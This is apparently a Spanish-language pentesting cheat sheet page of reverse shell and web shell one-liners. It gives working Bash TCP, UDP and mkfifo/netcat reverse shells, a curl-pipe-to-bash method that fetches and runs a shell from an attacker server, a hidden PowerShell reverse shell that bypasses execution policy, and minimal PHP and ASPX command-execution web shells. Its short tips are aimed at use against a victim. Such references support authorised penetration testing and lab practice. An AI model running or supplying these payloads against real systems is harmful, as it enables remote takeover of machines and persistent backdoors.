---
title: "Reverse Shells Cheatsheet"
layout: "single"
category: "Shells"
slug: "shells/reverse-shells"
date: "2025-11-26"
---

### Linux (Bash & Sh)
A menudo el puerto o las comillas determinan el éxito. Prueba todas.

```bash
# Bash TCP (La clásica)
bash -i >& /dev/tcp/10.10.10.10/443 0>&1

# Bash UDP (Si TCP está bloqueado)
sh -i >& /dev/udp/10.10.10.10/443 0>&1

# Mkfifo (Fiable para sh/dash)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f
```

### Web Exploitation (RCE via URL)
Si tienes ejecución de comandos en una URL, URL-encodea esto:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'
```

**Método "Curl | Bash" (Muy limpio):**
1. Crea `index.html` en tu Kali con el contenido: `bash -i >& /dev/tcp/10.10.10.10/443 0>&1`
2. Levanta servidor: `python3 -m http.server 80`
3. En la víctima:
```bash
curl 10.10.10.10 | bash
```

### Windows (PowerShell)
```powershell
# PowerShell One-Liner
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### WebShells (Upload)

**PHP:**
```php
<?php system($_GET['cmd']); ?>
```

**ASPX (IIS):**
Generar con msfvenom siempre es mejor, pero si necesitas una manual simple:
```aspx
<% response.write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>
```
